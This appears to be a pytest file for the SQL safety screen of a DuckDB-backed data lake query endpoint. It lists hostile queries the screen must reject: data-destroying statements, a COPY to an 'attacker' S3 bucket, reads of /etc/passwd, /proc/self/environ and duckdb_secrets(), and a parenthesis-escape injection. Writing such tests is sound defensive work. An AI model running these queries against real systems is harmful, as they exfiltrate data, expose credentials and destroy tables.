"""
Query-layer tests.

The DuckDB runner is the riskiest surface in the lake: it executes SQL.
We test the safety screen exhaustively. End-to-end query execution
against real parquet is covered by the docker-compose integration story,
not the unit suite.
"""
from __future__ import annotations

from uuid import uuid4

import pytest

from aran_lake.query.duckdb_runner import QueryRejected, _screen_sql
from tests.conftest import auth_headers

# --- the safety screen ---

@pytest.mark.parametrize("good_sql", [
    "SELECT 1",
    "SELECT * FROM snapshot",
    "SELECT count(*) FROM snapshot WHERE x > 0",
    "WITH t AS (SELECT 1 AS n) SELECT n FROM t",
    "SELECT a, b FROM snapshot ORDER BY a LIMIT 100",
])
def test_screen_passes_legitimate_queries(good_sql: str) -> None:
    _screen_sql(good_sql)  # should not raise


@pytest.mark.parametrize("bad_sql", [
    "DROP TABLE x",
    "drop table x",  # case insensitive
    "CREATE TABLE x AS SELECT 1",
    "INSERT INTO x VALUES (1)",
    "DELETE FROM x",
    "UPDATE x SET y = 1",
    "ALTER TABLE x DROP COLUMN y",
    "ATTACH 'host=evil' AS bad (TYPE POSTGRES)",
    "DETACH bad",
    "COPY x TO 's3://attacker/'",
    "INSTALL httpfs",
    "LOAD httpfs",
    "PRAGMA memory_limit='100GB'",
    "EXPORT DATABASE 'x'",
    "TRUNCATE x",
    "SELECT 1; DROP TABLE x",  # piggyback
])
def test_screen_rejects_dangerous_statements(bad_sql: str) -> None:
    with pytest.raises(QueryRejected):
        _screen_sql(bad_sql)


@pytest.mark.parametrize("bad_sql", [
    # Read-only, and every one of them returns something the caller must not
    # have. The statement-type screen above passes all of these.
    "SELECT * FROM read_csv_auto('/etc/passwd')",
    "SELECT * FROM read_text('/proc/self/environ')",
    "SELECT * FROM read_parquet('s3://other-bucket/x.parquet')",
    "SELECT * FROM postgres_scan('host=db', 'public', 'tenant')",
    "SELECT * FROM glob('/**')",
    # duckdb_secrets() returns the S3 key and secret the runner installs on
    # every connection — the lake's credential to every tenant's objects.
    "SELECT * FROM duckdb_secrets()",
    "SELECT * FROM duckdb_settings()",
    # A replacement scan: a reader with no function name in it at all.
    "SELECT * FROM '/etc/passwd.csv'",
    "SELECT * FROM $$/etc/passwd.csv$$",
    "SELECT * FROM E'/etc/passwd.csv'",
    "SELECT * FROM snapshot JOIN '/etc/passwd.csv' t ON true",
])
def test_screen_rejects_reads_outside_the_snapshot(bad_sql: str) -> None:
    with pytest.raises(QueryRejected):
        _screen_sql(bad_sql)


@pytest.mark.parametrize("good_sql", [
    # The screen keys on position and on call syntax, so ordinary literals and
    # quoted identifiers must survive it.
    "SELECT * FROM snapshot WHERE path = '/etc/passwd.csv'",
    "SELECT * FROM \"snapshot\"",
    "SELECT 'literal' AS c FROM snapshot",
    "SELECT * FROM snapshot WHERE name IN ('a.csv', 'b.csv')",
])
def test_screen_still_passes_ordinary_literals(good_sql: str) -> None:
    _screen_sql(good_sql)  # should not raise


# --- the statement boundary ---
#
# The runner executes caller SQL inside `SELECT * FROM (<sql>) AS _cap LIMIT n`.
# A caller who closes that parenthesis themselves gets a second statement the
# wrapper never constrained, so a semicolon anywhere but the very end is refused.
# The check came from the deleted `materialize_to_local_parquet`, which had it
# while /api/query did not (audit LAKE_SERVICE-1).

@pytest.mark.parametrize("bad_sql", [
    # Both halves are innocuous on their own — nothing in _FORBIDDEN_PATTERNS
    # matches either — so only the boundary check can reject these.
    "SELECT 1; SELECT 2",
    "SELECT * FROM snapshot; SELECT 2",
    # The escape itself: the caller closes the LIMIT wrapper's paren and
    # re-opens it, leaving a middle statement outside the cap.
    "SELECT 1) AS t; SELECT count(*) FROM (SELECT 1",
    # Trailing semicolons are stripped before the check, so this is caught by
    # the leading one rather than by the trailing one being present.
    "SELECT 1; SELECT 2;",
])
def test_screen_rejects_multi_statement_sql(bad_sql: str) -> None:
    with pytest.raises(QueryRejected, match="single statement"):
        _screen_sql(bad_sql)


@pytest.mark.parametrize("good_sql", [
    # One statement that happens to be terminated is still one statement.
    "SELECT 1;",
    "SELECT * FROM snapshot;  ",
    "SELECT * FROM snapshot;;",
])
def test_screen_allows_a_trailing_semicolon(good_sql: str) -> None:
    _screen_sql(good_sql)  # should not raise


# --- end-to-end query through HTTP layer ---

def test_query_endpoint_rejects_dangerous_sql(http_client, tenant_id) -> None:
    resp = http_client.post(
        "/api/query",
        json={"snapshot_id": str(uuid4()), "sql": "DROP TABLE snapshot"},
        headers=auth_headers(tenant_id),
    )
    # Either 400 (screen caught it) or 404 (snapshot not found, screen
    # would have caught it eventually). Both are acceptable — what
    # matters is that we don't get a 500 or, worse, a 200.
    assert resp.status_code in {400, 404}


def test_query_for_nonexistent_snapshot_returns_404(http_client, tenant_id) -> None:
    resp = http_client.post(
        "/api/query",
        json={"snapshot_id": str(uuid4()), "sql": "SELECT 1"},
        headers=auth_headers(tenant_id),
    )
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_query_endpoint_rejects_a_two_statement_body(
    http_client, tenant_id, seed_session,
) -> None:
    """
    The snapshot exists, so a 404 cannot stand in for the screen: a 400 here is
    the boundary check firing on a body whose two statements are individually
    innocuous. Refusal happens before DuckDB connects, so no object store is
    needed even though the snapshot row points at one.
    """
    from aran_lake.catalog import repositories as repo

    dataset_id = uuid4()
    await repo.upsert_dataset(seed_session, tenant_id=tenant_id, dataset_id=dataset_id)
    snap = await repo.create_snapshot(
        seed_session,
        tenant_id=tenant_id,
        dataset_id=dataset_id,
        object_key=f"{tenant_id}/snapshots/{dataset_id}/abc.parquet",
        content_hash="h" * 64,
        size_bytes=100,
        row_count=10,
        content_type="application/vnd.apache.parquet",
    )
    await seed_session.commit()

    resp = http_client.post(
        "/api/query",
        json={
            "snapshot_id": str(snap.id),
            "sql": "SELECT 1) AS t; SELECT count(*) FROM (SELECT 1",
        },
        headers=auth_headers(tenant_id),
    )
    assert resp.status_code == 400, resp.text
    assert "single statement" in resp.json()["detail"]
